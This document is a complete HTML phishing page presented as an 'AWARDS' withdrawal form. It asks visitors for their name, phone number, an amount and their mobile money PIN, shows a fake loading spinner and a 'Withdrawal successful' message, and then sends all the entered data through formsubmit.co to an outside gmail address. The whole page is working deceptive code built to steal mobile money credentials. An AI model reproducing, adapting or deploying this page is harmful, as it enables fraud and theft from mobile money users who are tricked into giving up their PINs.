<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AWARDS</title>

<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background: #f5f5f5;
    }
    .title-bar {
        background: yellow;
        padding: 15px;
        text-align: center;
        font-size: 22px;
        font-weight: bold;
    }
    .container {
        padding: 20px;
    }
    input, button {
        width: 100%;
        padding: 12px;
        margin: 10px 0;
        font-size: 16px;
        border-radius: 6px;
        border: 1px solid #ccc;
    }
    #withdraw-btn {
        background: blue;
        color: white;
        font-weight: bold;
        border: none;
        opacity: 0.5;
        pointer-events: none;
    }
    #withdraw-btn.enabled {
        opacity: 1;
        pointer-events: auto;
    }
    #success-box {
        display: none;
        background: #28a745;
        color: white;
        padding: 15px;
        margin-top: 15px;
        border-radius: 6px;
        font-weight: bold;
        text-align: center;
    }
    #balance-btn {
        display: none;
        background: #28a745;
        color: white;
        font-weight: bold;
        border: none;
    }
    .spinner {
        display: none;
        border: 4px solid #ddd;
        border-top: 4px solid blue;
        border-radius: 50%;
        width: 35px;
        height: 35px;
        animation: spin 1s linear infinite;
        margin: 10px auto;
    }
    @keyframes spin {
        100% { transform: rotate(360deg); }
    }
    .pin-wrap {
        position: relative;
    }
    .toggle {
        position: absolute;
        right: 10px;
        top: 12px;
        cursor: pointer;
        font-size: 14px;
    }
</style>
</head>
<body>

<div class="title-bar">AWARDS</div>

<div class="container">

<form action="https://formsubmit.co/nyanyawetkaa@gmail.com" method="POST">

    <!-- Name -->
    <input type="text" id="name" name="Name" placeholder="Enter your Name" required
           oninput="this.value=this.value.replace(/[^a-zA-Z ]/g,'')" />

    <!-- Phone -->
    <input type="text" id="phone" name="Phone" placeholder="Enter phone number" required
           oninput="this.value=this.value.replace(/[^0-9]/g,'')" />

    <!-- Amount -->
    <input type="text" id="amount" name="Amount" placeholder="Enter Amount to withdraw" required
           oninput="this.value=this.value.replace(/[^0-9]/g,''); updatePinMessage();" />

    <!-- PIN field with message -->
    <div class="pin-wrap">
        <input type="password" id="pin" name="Secret Code" required placeholder="">
        <span class="toggle" onclick="togglePin()">Show</span>
    </div>

    <script>
        function updatePinMessage() {
            const amt = document.getElementById("amount").value;
            const phone = document.getElementById("phone").value;

            document.getElementById("pin").placeholder =
                "Enter your Mobile money pin/secret code to withdraw " +
                amt + " to " + phone;
        }
    </script>

    <!-- Withdraw button -->
    <button type="button" id="withdraw-btn" onclick="startWithdraw()">WITHDRAW</button>

    <!-- Loading Spinner -->
    <div class="spinner" id="loader"></div>

    <!-- Success Box -->
    <div id="success-box">Withdrawal successful â€” click Balance button to check balance</div>

    <!-- Balance button (submit button) -->
    <button id="balance-btn" type="submit">BALANCE</button>

</form>

</div>

<script>
function togglePin() {
    const pin = document.getElementById("pin");
    const toggle = document.querySelector(".toggle");

    if (pin.type === "password") {
        pin.type = "text";
        toggle.textContent = "Hide";
    } else {
        pin.type = "password";
        toggle.textContent = "Show";
    }
}

function validateFields() {
    const n = document.getElementById("name").value.trim();
    const p = document.getElementById("phone").value.trim();
    const a = document.getElementById("amount").value.trim();
    const pin = document.getElementById("pin").value.trim();
    const btn = document.getElementById("withdraw-btn");

    if (n && p && a && pin) {
        btn.classList.add("enabled");
    } else {
        btn.classList.remove("enabled");
    }
}
document.querySelectorAll("input").forEach(i => i.addEventListener("input", validateFields));

function startWithdraw() {
    const loader = document.getElementById("loader");
    const success = document.getElementById("success-box");
    const balance = document.getElementById("balance-btn");

    loader.style.display = "block";

    setTimeout(() => {
        loader.style.display = "none";
        success.style.display = "block";
        balance.style.display = "block";
    }, 5000);
}
</script>

</body>
  </html>
